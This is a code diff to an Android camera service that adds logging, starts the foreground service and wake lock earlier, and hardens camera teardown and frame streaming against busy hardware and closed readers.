@@ -139,8 +139,15 @@ public class CameraService extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
+        // Start foreground service as early as possible
+        startForeground();
+        
+        // Acquire WakeLock
+        acquireWakeLock();
+
         if (intent != null) {
             String action = intent.getAction();
+            Log.d(TAG, "OnStartCommand Action: " + action);
             if ("START_STREAM".equals(action)) {
                 String camId = intent.getStringExtra("cameraId");
                 int width = intent.getIntExtra("width", 640);
@@ -168,11 +175,6 @@ public class CameraService extends Service {
             }
         }
 
-        // Acquire WakeLock
-        acquireWakeLock();
-
-        // Start foreground service
-        startForeground();
         return START_NOT_STICKY;
     }
 
@@ -321,6 +323,13 @@ public class CameraService extends Service {
     // ============ PHOTO CAPTURE ============
 
     public void capturePhotoBackground(String cameraId) {
+        if (isStreaming || isRecording) {
+            Log.w(TAG, "Camera busy with stream/record, attempt cleanup");
+            // Optionally stop stream/record to take photo, or just fail
+            lastCaptureError = "Camera hardware busy (Stream/Record active)";
+            return;
+        }
+
         if (cameraId == null)
             cameraId = "0";
 
@@ -424,6 +433,7 @@ public class CameraService extends Service {
 
                 @Override
                 public void onError(@NonNull CameraDevice camera, int error) {
+                    Log.e(TAG, "Capture error: " + error + " on camera " + cameraId);
                     camera.close();
                     cameraDevice = null;
                     lastCaptureError = "Camera error: " + error;
@@ -487,11 +497,14 @@ public class CameraService extends Service {
     // ============ LIVE STREAMING ============
 
     public void startStreaming(String cameraId, int width, int height, int quality) {
+        Log.d(TAG, "Request to start streaming: " + cameraId);
         if (isStreaming) {
             stopStreaming();
+            // Add a short sleep to allow hardware release
+            try { Thread.sleep(500); } catch (Exception ignored) {}
         }
 
-        currentCameraId = cameraId != null ? cameraId : "0";
+        currentCameraId = (cameraId != null && !cameraId.isEmpty()) ? cameraId : "0";
         streamWidth = width > 0 ? width : 640;
         streamHeight = height > 0 ? height : 480;
         streamQuality = quality > 0 ? quality : 50;
@@ -519,6 +532,7 @@ public class CameraService extends Service {
     }
 
     private void startStreamingInternal() {
+        Log.d(TAG, "Initializing camera for internal stream: " + currentCameraId);
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             if (checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                 Log.e(TAG, "Camera permission not granted");
@@ -542,31 +556,31 @@ public class CameraService extends Service {
             imageReader.setOnImageAvailableListener(reader -> {
                 Image image = null;
                 try {
+                    if (!isStreaming || reader == null) return;
                     image = reader.acquireLatestImage();
-                    if (image != null && isStreaming) {
-                        // Set rotation: 90 for back, 270 for front
+                    if (image != null) {
+                        // ... same logic ...
                         int rotation = 90;
                         try {
                             Integer facing = characteristics.get(CameraCharacteristics.LENS_FACING);
                             if (facing != null && facing == CameraCharacteristics.LENS_FACING_FRONT) {
                                 rotation = 270;
                             }
-                        } catch (Exception e) {
-                        }
+                        } catch (Exception e) {}
                         
                         byte[] jpegData = yuv420ToJpeg(image, streamQuality, rotation);
                         if (jpegData != null) {
-                            // Clear old frames if queue is full
                             while (!frameQueue.offer(jpegData)) {
                                 frameQueue.poll();
                             }
                         }
                     }
+                } catch (IllegalStateException e) {
+                    Log.w(TAG, "ImageReader already closed, ignoring frame");
                 } catch (Exception e) {
                     Log.e(TAG, "Error processing frame", e);
                 } finally {
-                    if (image != null)
-                        image.close();
+                    if (image != null) try { image.close(); } catch (Exception ignored) {}
                 }
             }, backgroundHandler);
 
@@ -586,6 +600,7 @@ public class CameraService extends Service {
 
                 @Override
                 public void onError(@NonNull CameraDevice camera, int error) {
+                    Log.e(TAG, "Camera device error: " + error + " on camera " + currentCameraId);
                     camera.close();
                     cameraDevice = null;
                     isStreaming = false;
@@ -742,21 +757,23 @@ public class CameraService extends Service {
         return sizeList.get(sizeList.size() / 2);
     }
 
-    private void closeCamera() {
-        if (captureSession != null) {
-            try {
+    private synchronized void closeCamera() {
+        Log.d(TAG, "Closing camera resources");
+        try {
+            if (captureSession != null) {
                 captureSession.close();
-            } catch (Exception e) {
+                captureSession = null;
             }
-            captureSession = null;
-        }
-        if (cameraDevice != null) {
-            cameraDevice.close();
-            cameraDevice = null;
-        }
-        if (imageReader != null) {
-            imageReader.close();
-            imageReader = null;
+            if (cameraDevice != null) {
+                cameraDevice.close();
+                cameraDevice = null;
+            }
+            if (imageReader != null) {
+                imageReader.close();
+                imageReader = null;
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Error while closing camera", e);
         }
     }
 
@@ -1003,13 +1020,13 @@ public class CameraService extends Service {
                         isRecording = false;
                     }
 
-                    @Override
-                    public void onError(@NonNull CameraDevice camera, int error) {
-                        camera.close();
-                        cameraDevice = null;
-                        isRecording = false;
-                        Log.e(TAG, "Camera error during video recording: " + error);
-                    }
+                @Override
+                public void onError(@NonNull CameraDevice camera, int error) {
+                    Log.e(TAG, "Video recording camera error: " + error);
+                    camera.close();
+                    cameraDevice = null;
+                    isRecording = false;
+                }
                 }, backgroundHandler);
             }
 
